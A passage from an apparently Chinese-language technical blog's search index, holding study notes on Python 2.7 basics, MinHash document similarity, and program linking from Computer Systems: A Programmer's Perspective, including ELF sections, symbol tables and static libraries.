random</span><br><span class="line">a=<span class="built_in">range</span>(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span> a</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;在a序列中随便挑选一个：&quot;</span>+<span class="built_in">str</span>(random.choice(a))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;使用randrange函数：&quot;</span>+<span class="built_in">str</span>(random.randrange(<span class="number">100</span>,<span class="number">1000</span>,<span class="number">3</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;随机生成一个数在0-1之间&quot;</span>+<span class="built_in">str</span>(random.random())</span><br><span class="line">random.shuffle(a)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;打乱a的顺序&quot;</span>+<span class="built_in">str</span>(a)</span><br></pre></td></tr></table></figure><img src="/2021/03/05/Python/Python2.7%E8%AF%AD%E6%B3%95%E8%A7%84%E8%8C%83/image-20210306114541072.png" class="lazyload" data-srcset="/2021/03/05/Python/Python2.7%E8%AF%AD%E6%B3%95%E8%A7%84%E8%8C%83/image-20210306114541072.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210306114541072" style="zoom:50%;"><h1 id="4-Python循环控制语句"><a href="#4-Python循环控制语句" class="headerlink" title="4.Python循环控制语句"></a>4.Python循环控制语句</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for iterating_var in sequence:</span><br><span class="line">statements(s)</span><br></pre></td></tr></table></figure><p>使用内置函数 len() 和 range()，函数 len() 返回列表的长度，即元素的个数。 range返回一个序列的数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">a=<span class="string">&quot;I LOVE YOU&quot;</span></span><br><span class="line"><span class="keyword">for</span> tmp <span class="keyword">in</span> a:</span><br><span class="line">  <span class="built_in">print</span> tmp</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line"><span class="comment">#len返回一个长度 range返回一个序列此例序列为[0:9]</span></span><br><span class="line">  <span class="built_in">print</span> <span class="built_in">str</span>(index)+<span class="string">&quot; : &quot;</span>+(a[index])</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> a[<span class="number">0</span>:<span class="number">10</span>]:</span><br><span class="line">  <span class="built_in">print</span> index</span><br></pre></td></tr></table></figure><img src="/2021/03/05/Python/Python2.7%E8%AF%AD%E6%B3%95%E8%A7%84%E8%8C%83/image-20210306115230828.png" class="lazyload" data-srcset="/2021/03/05/Python/Python2.7%E8%AF%AD%E6%B3%95%E8%A7%84%E8%8C%83/image-20210306115230828.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210306115230828" style="zoom:33%;"><h1 id="5-时间与日期"><a href="#5-时间与日期" class="headerlink" title="5.时间与日期"></a>5.时间与日期</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;标准格式化时间&quot;</span>+time.asctime( time.localtime(time.time()) )</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;时间戳&quot;</span>+<span class="built_in">str</span>(time.time())</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;时间结构&quot;</span>+<span class="built_in">str</span>(time.localtime(time.time()))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;根据格式格式化时间&quot;</span>+time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>,time.localtime(time.time()))</span><br></pre></td></tr></table></figure><p>其中<code>time.time()</code>拿到当前时间的时间戳，然后<code>time.localtime()</code>将时间戳转化为时间结构</p><p>运行结果：<img src="/2021/03/05/Python/Python2.7%E8%AF%AD%E6%B3%95%E8%A7%84%E8%8C%83/image-20210306130736274.png" class="lazyload" data-srcset="/2021/03/05/Python/Python2.7%E8%AF%AD%E6%B3%95%E8%A7%84%E8%8C%83/image-20210306130736274.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210306130736274" style="zoom:80%;"></p><p>python中时间日期格式化符号：</p><ul><li>%y 两位数的年份表示（00-99）</li><li>%Y 四位数的年份表示（000-9999）</li><li>%m 月份（01-12）</li><li>%d 月内中的一天（0-31）</li><li>%H 24小时制小时数（0-23）</li><li>%I 12小时制小时数（01-12）</li><li>%M 分钟数（00=59）</li><li>%S 秒（00-59）</li><li>%a 本地简化星期名称</li><li>%A 本地完整星期名称</li><li>%b 本地简化的月份名称</li><li>%B 本地完整的月份名称</li><li>%c 本地相应的日期表示和时间表示</li><li>%j 年内的一天（001-366）</li><li>%p 本地A.M.或P.M.的等价符</li><li>%U 一年中的星期数（00-53）星期天为星期的开始</li><li>%w 星期（0-6），星期天为星期的开始</li><li>%W 一年中的星期数（00-53）星期一为星期的开始</li><li>%x 本地相应的日期表示</li><li>%X 本地相应的时间表示</li><li>%Z 当前时区的名称</li><li>%% %号本身</li></ul><h1 id="6-正则表达式"><a href="#6-正则表达式" class="headerlink" title="6.正则表达式"></a>6.正则表达式</h1><h3 id="1-re-match函数"><a href="#1-re-match函数" class="headerlink" title="1.re.match函数"></a>1.re.match函数</h3><p>尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功，match()就返回none。</p><p><code>re.match(pattern,string,flags=0)</code></p><h3 id="2-re-search方法"><a href="#2-re-search方法" class="headerlink" title="2.re.search方法"></a>2.re.search方法</h3><p>re.search扫描整个字符串并返回第一个成功的匹配</p><p><code>re.search(pattern,string,flags=0)</code></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构-文档相似性</title>
      <link href="/2020/12/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%96%87%E6%A1%A3%E7%9B%B8%E4%BC%BC%E6%80%A7/"/>
      <url>/2020/12/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%96%87%E6%A1%A3%E7%9B%B8%E4%BC%BC%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="1-minhash"><a href="#1-minhash" class="headerlink" title="1.minhash"></a>1.minhash</h1><h3 id="1-基本原理"><a href="#1-基本原理" class="headerlink" title="1.基本原理"></a>1.基本原理</h3><p><img src="/2020/12/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%96%87%E6%A1%A3%E7%9B%B8%E4%BC%BC%E6%80%A7/204641_hN6E_1451225.png" class="lazyload" data-srcset="/2020/12/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%96%87%E6%A1%A3%E7%9B%B8%E4%BC%BC%E6%80%A7/204641_hN6E_1451225.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>可以看到其中的S<del>1</del>={a,d} S<del>2</del>={c} S<del>3</del>={b,d,e} S<del>4</del>={a,c,d}</p><p>为了得到各个集合的最小哈希值，首先对矩阵进行随机行打乱，则某集合的最小哈希值等于打乱后这一列第一个值为1的行所在的行号，打乱后的0-1矩阵为</p><img src="/2020/12/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%96%87%E6%A1%A3%E7%9B%B8%E4%BC%BC%E6%80%A7/205852_80MT_1451225.png" class="lazyload" data-srcset="/2020/12/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%96%87%E6%A1%A3%E7%9B%B8%E4%BC%BC%E6%80%A7/205852_80MT_1451225.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img" style="zoom:67%;"><p>如果所示，h(S<del>1</del>)=2 h(S<del>2</del>)=4 h(S<del>3</del>)=0 h(S<del>4</del>)=2</p><p> 现仅考虑集合S1和S2，那么这两列所在的行有下面3种类型：<br>    1、S1和S2的值都为1，记为X<br>    2、只有一个值为1，另一个值为0，记为Y<br>    3、S1和S2的值都为0，记为Z</p><p>​    S1和S2交集的元素个数为x，并集的元素个数为x+y，所以sim(S1,S2) = Jaccard(S1,S2) = x/(x+y)。接下来计算h(S1)=h(S2)的概率，经过随机行打乱后，从上往下扫描，在碰到Y行之前碰到X行的概率为x/(x+y)，即h(S1)=h(S2)的概率为x/(x+y)。</p><h3 id="2-用hash函数计算前面矩阵"><a href="#2-用hash函数计算前面矩阵" class="headerlink" title="2.用hash函数计算前面矩阵"></a>2.用hash函数计算前面矩阵</h3><p><img src="/2020/12/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%96%87%E6%A1%A3%E7%9B%B8%E4%BC%BC%E6%80%A7/215806_EWGN_1451225.png" class="lazyload" data-srcset="/2020/12/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%96%87%E6%A1%A3%E7%9B%B8%E4%BC%BC%E6%80%A7/215806_EWGN_1451225.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>深入理解计算机系统-链接</title>
      <link href="/2020/12/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E9%93%BE%E6%8E%A5/"/>
      <url>/2020/12/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E9%93%BE%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="1-编译器驱动程序"><a href="#1-编译器驱动程序" class="headerlink" title="1.编译器驱动程序"></a>1.编译器驱动程序</h1><p>大多数编译系统提供<strong>编译器驱动程序</strong>，它代表用户在需要时调用语言预处理器、编译器、汇编器和链接器。</p><p><img src="/2020/12/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E9%93%BE%E6%8E%A5/20170214151600306" class="lazyload" data-srcset="/2020/12/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E9%93%BE%E6%8E%A5/20170214151600306" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="1-预处理"><a href="#1-预处理" class="headerlink" title="1.预处理"></a>1.预处理</h3><p><strong>将源程序<code>main.c</code>翻译成一个ASCII码的中间文件<code>main.i</code></strong></p><p>预处理命令：输出的文件是<code>main.i</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpp [other arguments] main.c main.i</span><br></pre></td></tr></table></figure><h3 id="2-编译"><a href="#2-编译" class="headerlink" title="2.编译"></a>2.编译</h3><p><strong>将<code>main.i</code>翻译成一个ASCII汇编语言文件<code>main.s</code></strong></p><p>编译命令：输出的文件是<code>main.s</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cc1 main.i -Og [other argunments] -o main.s</span><br></pre></td></tr></table></figure><h3 id="3-汇编"><a href="#3-汇编" class="headerlink" title="3.汇编"></a>3.汇编</h3><p><strong>将<code>main.s</code>翻译成一个可重定位目标文件</strong></p><p>汇编命令：输出的文件是<code>main.o</code>，该文件是一个可重定位的目标文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">as [other arguments] -o main.o main.s</span><br></pre></td></tr></table></figure><h3 id="4-链接"><a href="#4-链接" class="headerlink" title="4.链接"></a>4.链接</h3><p>链接命令：创造一个可执行目标文件 elf；<code>main.o</code>和<code>sum.o</code>文件是需要链接的重定位目标文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ld -o elf [system object files and args] main.o sum.o </span><br></pre></td></tr></table></figure><span id="more"></span><h1 id="2-静态链接"><a href="#2-静态链接" class="headerlink" title="2.静态链接"></a>2.静态链接</h1><p>输入可重定位目标文件由不同的<strong>代码</strong>和<strong>数据节</strong>组成，每一节都是一个连续的字节序列。指令在一节(.text)中，初始化了的全局变量(.data)在另一节中，而未初始化的变量(.bss)又在另外一节中</p><h3 id="在链接过程链接器需要完成的任务："><a href="#在链接过程链接器需要完成的任务：" class="headerlink" title="在链接过程链接器需要完成的任务："></a>在链接过程链接器需要完成的任务：</h3><h5 id="1-符号解析"><a href="#1-符号解析" class="headerlink" title="1.符号解析"></a>1.符号解析</h5><p>目标文件定义和引用符号，每个符号对应于一个函数、一个全局变量或一个静态变量(C语言中声明的static属性的变量)，符号解析的目的是将每个符号<strong>引用</strong>正好和一个符号<strong>定义</strong>关联起来</p><h5 id="2-重定位"><a href="#2-重定位" class="headerlink" title="2.重定位"></a>2.重定位</h5><p>编译器和汇编生成从地址0开始的代码和数据节。链接器通过把每个符号定义与一个内存位置关联起来，从而重定位这些节，然后修改所有对这些符号的引用，它们指向这个内存位置。链接器使用汇编器产生重定位条目的详细指令，不加区别地执行这样的重定位。</p><h1 id="3-目标文件、符号、符号表"><a href="#3-目标文件、符号、符号表" class="headerlink" title="3.目标文件、符号、符号表"></a>3.目标文件、符号、符号表</h1><h3 id="1-目标文件三种："><a href="#1-目标文件三种：" class="headerlink" title="1.目标文件三种："></a>1.目标文件三种：</h3><ul><li><p>可重定位目标文件</p><p>包含二进制代码和数据 <code>.o</code>文件</p></li><li><p>可执行目标文件 </p></li><li><p>共享目标文件 <code>.so</code> <code>.dll</code>文件</p></li></ul><h3 id="2-可重定位目标文件-o"><a href="#2-可重定位目标文件-o" class="headerlink" title="2.可重定位目标文件 .o"></a>2.可重定位目标文件 <code>.o</code></h3><h5 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构<img src="/2020/12/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E9%93%BE%E6%8E%A5/745401-20160406220240922-386749438.png" class="lazyload" data-srcset="/2020/12/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E9%93%BE%E6%8E%A5/745401-20160406220240922-386749438.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></h5><table><thead><tr><th>session</th><th align="center"></th><th></th></tr></thead><tbody><tr><td>ELF头</td><td align="center">ELF头以一个16字节序列开始，该序列描述生成文件的<strong>系统字的大小</strong>和<strong>字节顺序</strong>；剩下的内容包含帮助链接器语法分析和解释目标文件的信息，包含了ELF头的大小、目标文件的类型(如可重定位、可执行或者可共享)、机器类型(64位)、<strong>节头部表</strong>的文件偏移，以及节头部表中条目的大小和数量。不同节的位置和大小是由<strong>节头部表</strong>描述的，其中目标文件中每个节都有一个固定大小的条目</td><td></td></tr><tr><td>.text</td><td align="center">已编译程序的机器代码</td><td></td></tr><tr><td>.rodata</td><td align="center">只读数据。比如printf语句中的格式串和开关语句的跳转表</td><td></td></tr><tr><td>.data</td><td align="center">已初始化的全局和静态C变量。</td><td></td></tr><tr><td>.bss</td><td align="center">未初始化的全局和静态C变量，以及所有被初始化成0的全局或静态变量。在<strong>目标文件中这个节不占据实际的空间</strong>，仅仅是一个占位符。目标文件格式区分已初始化和未初始化变量是为了空间效率：在目标文件中，未初始化变量不需要占据任何空间。在运行时，内存中分配这些变量，初始值为0；</td><td></td></tr><tr><td>.symtab</td><td align="center">符号表，存放程序中定义和引用函数和全局变量的信息。</td><td></td></tr><tr><td>.rel.text</td><td align="center">一个.text文件<strong>节中位置</strong>的列表，当链接器把这个目标文件和其他文件组合时，需要<strong>修改</strong>这些位置，一般而言，任何调用外部函数或者引用全局变量的指令都需要修改。另一房间，调用本地函数的指令则不需要修改</td><td></td></tr><tr><td>.rel.data</td><td align="center">被模块引用或定义所有全局变量的重定位信息。一般而言，任何已初始化的全局变量，如果它的初始值是一个全部变量地址或者外部定义函数的地址，都需要链接器被修改。</td><td></td></tr><tr><td>.debug</td><td align="center">调试符号表，其条目是程序定义的局部变量和类型定义，程序中定义和引用的全局变量，以及初始的C源文件。编译加-g才能得到这张表</td><td></td></tr><tr><td>.line</td><td align="center">原始C源程序中的行号和.text节中机器指令之间的映射。编译加-g才能得到这张表</td><td></td></tr><tr><td>.strtab</td><td align="center">一个字符串表，其内容包含.symtab和.debug节中的符号表，以及节头部中的节名字。字符串表就是以null结尾的字符串序列。</td><td></td></tr><tr><td><strong>节头部表</strong></td><td align="center"></td><td></td></tr></tbody></table><h3 id="3-符号"><a href="#3-符号" class="headerlink" title="3.符号"></a>3.符号</h3><p>每个可重定位目标模块m都有一个符号表，它包含m定义和引用符号的信息，在链接器的上下文，有三种不同的符号。</p><p><em>链接符号：</em></p><p><strong>全局符号</strong>：某一个模块定义、且可以被其他模块引用的变量或者函数符号(全局非静态函数或者变量)</p><p><strong>外部符号</strong>：某个模块引用的由其他模块定义的全局符号(extern)</p><p><strong>局部符号</strong>：由某个模块定义且仅有该模块引用的符号(静态的函数或者变量)</p><img src="/2020/12/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E9%93%BE%E6%8E%A5/image-20201220133442852.png" class="lazyload" data-srcset="/2020/12/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E9%93%BE%E6%8E%A5/image-20201220133442852.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201220133442852" style="zoom:50%;"><p>本地链接器符号和本地程序变量是不同的。.symtab中的符号表不包含对应于本地非静态程序变量的任何符号。定义为带有C~static属性的本地过程变量是不在栈中管理的，编译器在.data或.bss中为每个定义分配空间，并在符号表中创建一个有唯一名字的本地链接器符号。static属性隐藏模块内部的变量和函数声明，任何带有static属性声明的全局变量或者函数都是模块私有的</p><h3 id="4-符号表"><a href="#4-符号表" class="headerlink" title="4.符号表"></a>4.符号表</h3><p>符号表是由汇编器构造的，使用编译器输出到汇编语言.s文件中的符号。.symtab节中包含ELF符号表，这张符号表包含一个条目的数组</p><p>以下是每个条目的格式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> name;<span class="comment">//name是字符串表中的字节偏移，指向符号的以null结尾的字符串名字。</span></span><br><span class="line">    <span class="keyword">char</span> type:<span class="number">4</span> <span class="comment">//数据或者函数。符号表还可以包含各个节的条目，以及对应原始源文件的路径名的条目，所以这些目标类型也有所不同。</span></span><br><span class="line">         binding:<span class="number">4</span>;<span class="comment">//binding字段表示符号是本地还是全局的。</span></span><br><span class="line">    <span class="keyword">char</span> reserved;</span><br><span class="line">    <span class="keyword">short</span> section;<span class="comment">//每个符号都被分配到目标文件的某个节，由section字段表示，该字段也是一个到节头部表的索引。</span></span><br><span class="line">    <span class="keyword">long</span> value;<span class="comment">//value是符号的地址。对于可重定位的模块来说，value是距目标的节的其实位置的偏移。对于可执行文件来说，该值是一个绝对运行时的地址。</span></span><br><span class="line">    <span class="keyword">long</span> size;<span class="comment">//size是目标的大小(以字节为单位)。</span></span><br><span class="line">&#125;Elf64_Symbol</span><br></pre></td></tr></table></figure><p>关于section字段：该字段也是一个到节头部表的索引。</p><p>有三个特殊的伪节，其在节头部表中是没有条目的：ABS代表不该被重定位的符号；UNDEF代表未定义的符号，也就是在本目标模块中引用，但是在其他地方定义的符号；COMMON表示还未被分配位置的未初始化的数据目标。</p><p>对于COMMON符号，value字段给出对齐要求，而size给出最小的大小。只有可重定位目标文件中才有这些伪节，可执行文件中是没有的。</p><h1 id="4-符号解析"><a href="#4-符号解析" class="headerlink" title="4.符号解析"></a>4.符号解析</h1><p>链接器解析符号引用的方法是将<strong>每个引用</strong>于它输入的可<strong>重定位目标文件的符号表</strong>中的一个确定的<strong>符号定义</strong>关联起来。编译器只允许每个模块中每个局部符号有一个定义，静态局部变量也会有本地链接器的符号，编译器还要确保它们拥有唯一的名字。</p><h3 id="1-链接器解析多重定义的全局符号"><a href="#1-链接器解析多重定义的全局符号" class="headerlink" title="1.链接器解析多重定义的全局符号"></a>1.链接器解析多重定义的全局符号</h3><p>链接器输入是一组可重定位目标模块、在编译时，编译器向汇编器输出每个全局符号，<strong>强</strong>或<strong>弱</strong>，而汇编器把这个信息隐含地编码在可重定位目标文件的符号表里。函数和已初始化的全局变量是强符号，未初始化的全局变量是弱符号。</p><p>以下三个规则：</p><ul><li>不允许有多个同名的强符号</li><li>如果有一个强符号和多个弱符号同名，选择强符号</li><li>如果有多个弱符号同名，那么这些符号任意选择一个</li></ul><h3 id="2-与静态库链接"><a href="#2-与静态库链接" class="headerlink" title="2.与静态库链接"></a>2.与静态库链接</h3><p>所有相关的目标模块打包成一个单独的文件，称为静态库，它可以用做链接器的输入。当链接器构造一个输出的可执行文件时，它只复制静态库里的被应用程序引用的目标模块。相关的函数可以被编译成为独立的目标模块，然后封装成一个单独的静态库文件。然后，应用程序可以通过在命令行上指定单独的文件名字来使用这些在库中定义的函数。</p><p>在LINUX系统中，静态库以一种称为存档(archive)的特殊文件格式存放在磁盘中，存档文件是一组连接起来的可重定位目标文件的集合，有一个头部用来描述每个成员目标文件的大小和位置。存档文件名由后缀.a标识。</p><p><code>a.c文件</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> addcnt=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">all_add</span><span class="params">(<span class="keyword">int</span> *x, <span class="keyword">int</span> *y)</span></span>&#123;</span><br><span class="line">*x=*x+<span class="number">1</span>;</span><br><span class="line">*y=*y+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>b.c</code>文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> subcnt=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">all_sub</span><span class="params">(<span class="keyword">int</span> *x,<span class="keyword">int</span> *y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">*x=*x<span class="number">-1</span>;</span><br><span class="line">*y=*y<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>main.c</code>文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> x[<span class="number">2</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">all_add(&amp;x[<span class="number">0</span>],&amp;x[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;x:%d,y:%d&quot;</span>,x[<span class="number">0</span>],x[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c a.c b.c</span><br></pre></td></tr></table></figure><p><code>-c</code>参数生成可重定位的目标文件，未被链接，上面指令生成的是a.o以及b.o</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ar rcs all.a a.o b.o</span><br></pre></td></tr></table></figure><p>由.o文件创建静态库<code>all.a</code>文件<img 